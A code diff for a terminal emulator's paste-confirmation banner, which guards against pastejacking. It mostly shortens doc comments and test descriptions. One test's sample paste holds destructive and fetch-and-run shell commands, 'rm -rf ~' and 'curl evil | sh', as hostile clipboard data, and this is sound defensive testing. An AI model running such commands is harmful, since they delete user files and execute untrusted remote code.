@@ -1,36 +1,21 @@
 // SPDX-License-Identifier: Apache-2.0
 // Copyright 2026 Andrew Yates
 
-//! The Linux in-window MULTI-LINE-PASTE CONFIRMATION banner — the real confirm
-//! behind the pastejacking guard on the platforms that have no native alert.
+//! The multi-line-paste confirmation banner for platforms with no native alert (macOS asks
+//! through a window sheet, Windows through a `MessageBoxW`).
 //!
-//! macOS asks through a window sheet and Windows through a `MessageBoxW`; the
-//! remaining platforms used to "ask" through a fallback that returned `true`
-//! unconditionally, which made `confirm_multiline_paste = true` a silent no-op
-//! exactly where the X11 clipboard makes pastejacking easiest (audit finding).
-//! aterm composes its own chrome on Linux, so the confirmation is composed the
-//! same way: the pending paste is PARKED on `App` ([`PendingPaste`]) — fail
-//! closed, nothing reaches the PTY — and this banner is spliced over the top
-//! grid rows (the retired config banner's band pattern) showing a short
-//! sanitized PREVIEW of what is about to be pasted plus the two keys that
-//! answer it. Enter delivers the parked text through the confirmed seam, Escape
-//! (or a click on the banner) drops it. The keystroke decision reuses
-//! [`crate::alert_keys::confirm_key`], the router the macOS sheet interceptor
-//! answers through, so Enter and Escape mean the same on the band and the sheet.
-//! (The Windows `MessageBoxW` is Yes/No and does not route keys through it.)
+//! The pending paste is parked on `App` ([`PendingPaste`]), so nothing reaches the PTY until it
+//! is answered, and this banner is spliced over the top grid rows with a sanitized preview and
+//! the answer keys. Enter delivers the parked text through the confirmed seam; Escape or a click
+//! on the banner drops it. Keys route through [`crate::alert_keys::confirm_key`], as the macOS
+//! sheet's do. There is no TTL: the banner stands until answered, and closing the window drops
+//! the parked text.
 //!
-//! Pure + geometry-injected like `link_target`: the row builder takes explicit
-//! `cols`/`panel_rows` so it unit-tests without a window. Unlike the config
-//! banner there is NO TTL — a security question does not answer itself — and no
-//! auto-dismiss: the banner stands until a key or click answers it (the window
-//! closing drops the parked text, which is the fail-closed answer).
+//! The answer is bound to the session that asked. A tab click or `aterm ctl tab` can change the
+//! front session while the banner stands, so Enter delivers to the parked session, through the
+//! hidden-session seam if it is no longer in front.
 //!
-//! THE ANSWER IS BOUND TO THE SESSION THAT ASKED. The banner stands across event-
-//! loop turns, and a mouse click on the tab bar or an `aterm ctl tab` can change
-//! which session fronts the window while it does. The parked entry therefore
-//! carries the session that owned the paste gesture, and Enter delivers to THAT
-//! session — through the hidden-session seam if it is no longer in front — never
-//! to whichever tab happens to be front when the answer arrives.
+//! The row builder takes explicit `cols`/`panel_rows`, so it unit-tests without a window.
 
 use aterm_core::terminal::RenderCell;
 #[cfg(test)]
@@ -39,38 +24,30 @@ use aterm_render::Theme;
 use crate::chrome_band;
 use crate::settings::{blank_row, write_str};
 
-/// Cap the banner height: 1 title row + up to [`MAX_PREVIEW_LINES`] preview rows
-/// (the last of which becomes the "+N more" tally when the paste is longer), plus
-/// one row for the answer keys when they do not fit beside the question.
+/// Banner height without a separate keys row: the title plus up to [`MAX_PREVIEW_LINES`]
+/// preview rows, the last of which becomes the "+N more" tally when the paste is longer.
 const MAX_BANNER_ROWS: usize = 5;
 /// How many lines of the pending paste are previewed at most.
 const MAX_PREVIEW_LINES: usize = MAX_BANNER_ROWS - 1;
 
-/// The banner's left margin and the preview's hanging indent, in cells
-/// (mirrors `link_target`).
+/// The banner's left margin and the preview's hanging indent, in cells.
 const MARGIN: usize = 2;
 const PREVIEW_INDENT: usize = MARGIN + 2;
 
-/// ONE parked multi-line paste awaiting the user's answer. Held by `App` in
-/// `Option<PendingPaste>`: `Some` ⇔ the banner is up and an answer is owed,
-/// which is what enforces "at most one confirmation at a time" (the macOS
-/// sheet's rule). The TEXT lives here and nowhere else — dropping the entry IS
-/// the cancel, so no exit path can leak an unconfirmed paste to the PTY.
+/// One parked multi-line paste awaiting an answer. `App` holds it as `Option<PendingPaste>`:
+/// `Some` means the banner is up, so there is at most one confirmation at a time. The text lives
+/// only here: dropping the entry is the cancel, so no exit path leaks an unconfirmed paste.
 pub(crate) struct PendingPaste {
-    /// The window the paste targets — the banner splices into this window and
-    /// only ITS keys answer it; the entry dies with the window.
+    /// The window the paste targets; only its keys answer, and the entry dies with the window.
     pub(crate) wid: crate::WindowId,
-    /// The terminal session that fronted `wid` when the paste gesture happened —
-    /// the one the question is ABOUT, and the only one the answer may reach.
-    /// `None` when the window fronted no terminal (native content), in which
-    /// case delivery keeps the ordinary front-content routing.
+    /// The terminal session that fronted `wid` at the paste gesture, and the only one the answer
+    /// may reach. `None` when the window fronted native content, which keeps the ordinary
+    /// front-content routing.
     pub(crate) session: Option<u64>,
     text: String,
     source: crate::input::Source,
-    /// The DEC 2004 reading the QUESTION was asked under. Parked with the text
-    /// because the answer lands later still (the ordered writer drains it), and
-    /// a program on the other end can flip the mode while the banner stands: the
-    /// paste must reach the PTY framed the way the banner said it would be.
+    /// The DEC 2004 (bracketed paste) framing the question was asked under: the program can
+    /// flip the mode while the banner stands, and the paste must reach the PTY framed as asked.
     framing: crate::input::PasteFraming,
     /// This question's serial, unique in the process and never `0`: the
     /// repaint key's term for it (`App::question_key`).
@@ -84,9 +61,7 @@ pub(crate) fn next_question_serial() -> u64 {
 }
 
 impl PendingPaste {
-    // Built only by `present_multiline_paste_banner`, which is
-    // `#[cfg(not(any(target_os = "macos", windows)))]`. `test` is in the set because
-    // this module's own tests construct one on every platform.
+    // Built by `present_multiline_paste_banner` (neither macOS nor Windows) and by tests.
     #[cfg(any(test, not(any(target_os = "macos", windows))))]
     pub(crate) fn new(
         wid: crate::WindowId,
@@ -138,9 +113,8 @@ impl PendingPaste {
     }
 }
 
-/// `s` cut to `max` cells with a trailing ellipsis when it does not fit (the
-/// `link_target` shape: a hard cut reads like corruption, an ellipsis says
-/// "there is more"). The close-confirm panel cuts its lines with this too.
+/// `s` cut to `max` cells, ending in an ellipsis when it does not fit. The close-confirm panel
+/// uses it too.
 pub(crate) fn ellipsized(s: &str, max: usize) -> String {
     if max == 0 {
         return String::new();
@@ -153,21 +127,17 @@ pub(crate) fn ellipsized(s: &str, max: usize) -> String {
     out
 }
 
-/// One preview line with every CONTROL character replaced by a visible middle
-/// dot. The paste body can carry ESC/C1 bytes and tabs a hostile clipboard put
-/// there; the banner's whole point is showing the user what is REALLY on the
-/// clipboard, and a control byte must neither corrupt the chrome band cells
-/// (`write_str` writes one char per cell) nor render as nothing.
+/// One preview line with every control character shown as a middle dot: a hostile clipboard's
+/// ESC/C1 bytes and tabs must neither corrupt the band's cells (`write_str` writes one char per
+/// cell) nor render as nothing.
 fn sanitized(line: &str) -> String {
     line.chars()
         .map(|c| if c.is_control() { '\u{00b7}' } else { c })
         .collect()
 }
 
-/// The two keys that answer the question, right-aligned on the title row and
-/// spoken as the a11y question's description. `pub(crate)` and named once: the
-/// banner a sighted user reads and the alert a screen reader hears must offer
-/// the SAME two answers, and a second literal is how they stop doing that.
+/// The two keys that answer the question, right-aligned on the title row and spoken as the a11y
+/// alert's description: one constant, so the banner and the screen reader offer the same answers.
 pub(crate) const ANSWER_KEYS: &str = "Enter pastes \u{00b7} Esc cancels";
 
 /// [`ANSWER_KEYS`] for a window too narrow to carry the verbs beside the question.
@@ -178,8 +148,7 @@ const ANSWER_KEYS_SHORT: &str = "Enter \u{00b7} Esc";
 /// sheet and the Windows dialog.
 pub(crate) const RISK: &str = "Each line may run as a command.";
 
-/// The accessible alert's description: the risk, then the answer keys. One builder
-/// for the announcement and its test.
+/// The accessible alert's description: the risk, then the answer keys.
 #[cfg(a11y_tree)]
 pub(crate) fn announcement_detail() -> String {
     format!("{RISK} {ANSWER_KEYS}")
@@ -204,18 +173,15 @@ fn title_row(text: &str, cols: usize) -> (String, Option<&'static str>) {
     (question, keys)
 }
 
-/// The QUESTION the banner asks about `text`, as one sentence.
-///
-/// The title row's words and the accessible alert's name come from here, so the
-/// pixels and the announcement cannot claim a different number of lines. Words
+/// The question the banner asks about `text`, as one sentence. The title row and the accessible
+/// alert's name both come from here, so they cannot claim different line counts. Words
 /// only: the painted warn mark is added by [`banner_rows`].
 pub(crate) fn question(text: &str) -> String {
     format!("Paste {}?", lines_words(paste_lines(text).len()))
 }
 
-/// `1 line` / `N lines`: the count every confirmation names (the banner, the
-/// macOS sheet, the Windows dialog). One command plus its newline asks too
-/// when the paste is unbracketed, and "Paste 1 lines?" is not a question.
+/// `1 line` / `N lines`: the count every confirmation names (the banner, the macOS sheet, the
+/// Windows dialog).
 pub(crate) fn lines_words(n: usize) -> String {
     if n == 1 {
         "1 line".to_string()
@@ -248,11 +214,10 @@ pub(crate) fn paste_lines(text: &str) -> Vec<&str> {
     lines
 }
 
-/// PURE grid-cell row builder: exactly `panel_rows` rows, each exactly `cols`
-/// wide, so the splice overwrites frame rows in place (the retired config banner's
-/// contract). Row 0 carries the question ([`question`]) with the two answer keys
-/// ([`ANSWER_KEYS`]) right-aligned; the following rows preview the paste body,
-/// sanitized and ellipsized, with a "+N more lines" tally when it overflows.
+/// Pure row builder: exactly `panel_rows` rows, each exactly `cols` wide, so the splice
+/// overwrites frame rows in place. Row 0 carries the [`question`] with the [`ANSWER_KEYS`]
+/// right-aligned; the rows below preview the paste body, sanitized and ellipsized, with a
+/// "+N more lines" tally when it overflows.
 pub(crate) fn banner_rows(
     text: &str,
     cols: usize,
@@ -268,9 +233,8 @@ pub(crate) fn banner_rows(
     }
     let lines = paste_lines(text);
     let (title, row0_keys) = title_row(text, cols);
-    // `value` (not the dim `label`): the answer keys are not an aside — they are
-    // the only way to answer (every other key is swallowed), so they read at full
-    // tone and never drop.
+    // The answer keys are written in `value`, not the dim `label`: every other key is
+    // swallowed, so they are the only way out and never drop.
     let mut first_preview = 1;
     if let Some(keys) = row0_keys {
         write_str(&mut rows[0], cols, MARGIN, &title, c.warn, c.bar_bg, true);
@@ -390,12 +354,8 @@ mod tests {
         );
     }
 
-    /// THE SEAM IS THE BAND'S TOP EDGE, so it must run the whole width. It did not:
-    /// this builder inherited the retired config banner's band pattern its header names, and
-    /// the same hole with it — `blank_row` stamps the rule, then the question and the
-    /// answer keys punch themselves out of it (`write_str` rebuilds every cell it
-    /// touches with no overline), leaving three stubs where a boundary belongs. A
-    /// security question is the last band that should look half-drawn.
+    /// The seam is the band's top edge, so it runs the whole width even where the question and
+    /// the answer keys are written (`write_str` rebuilds each cell with no overline).
     #[test]
     fn the_seam_runs_unbroken_and_one_toned_across_the_question_row() {
         let theme = Theme::default();
@@ -411,9 +371,8 @@ mod tests {
                 .map(|(col, _)| col)
                 .collect::<Vec<_>>()
         );
-        // AND IT IS ONE TONE. The row carries the warn-coloured question beside the
-        // full-tone answer keys, so a seam left to each cell's `fg` would change colour
-        // twice along a single hairline.
+        // One tone: the row carries two inks, so a seam left to each cell's `fg` would change
+        // colour along the hairline.
         let seams: std::collections::BTreeSet<Option<[u8; 3]>> =
             question.iter().map(|cell| cell.overline_color).collect();
         assert_eq!(
@@ -431,12 +390,11 @@ mod tests {
             inks.len() > 1,
             "the question row is meant to carry two inks, so this proof is not vacuous: {inks:?}"
         );
-        // ONLY the top row is an edge; the preview rows sit inside the band.
+        // Only the top row is an edge; the preview rows sit inside the band.
         assert!(rows[1].iter().all(|cell| !cell.overline));
     }
 
-    /// A CAPPED PREVIEW MUST SAY IT IS CAPPED — five shown lines with no tally
-    /// reads as "that is the whole paste", which defeats the preview's purpose.
+    /// A capped preview says it is capped: shown lines with no tally read as the whole paste.
     #[test]
     fn an_overflowing_paste_counts_what_it_hid() {
         let text: String = (0..20)
@@ -458,9 +416,8 @@ mod tests {
         assert!(text_of(&rows[3]).contains("line 2"), "three lines shown");
     }
 
-    /// THE PREVIEW IS THE SECURITY SURFACE: a hidden control byte (the exact
-    /// pastejacking payload — ESC, C1, a bare CR) must show up as a visible
-    /// mark, never vanish or write outside its own cell.
+    /// A control byte in the preview (ESC, a tab) shows as a visible mark, never vanishing or
+    /// writing outside its cell.
     #[test]
     fn control_bytes_in_the_preview_become_visible_marks() {
         let rows = banner_rows("safe\u{1b}[31mred\ttab", 80, 2, Theme::default());
@@ -484,8 +441,8 @@ mod tests {
         }
     }
 
-    /// A NARROW WINDOW STILL SHOWS THE ANSWER. The band swallows every other key,
-    /// so a question without its keys has no visible way out.
+    /// A narrow window still shows the answer keys: the band swallows every other key, so a
+    /// question without them has no visible way out.
     #[test]
     fn a_narrow_band_keeps_the_answer_keys() {
         let text = "ls\nrm -rf ~\ncurl evil | sh";
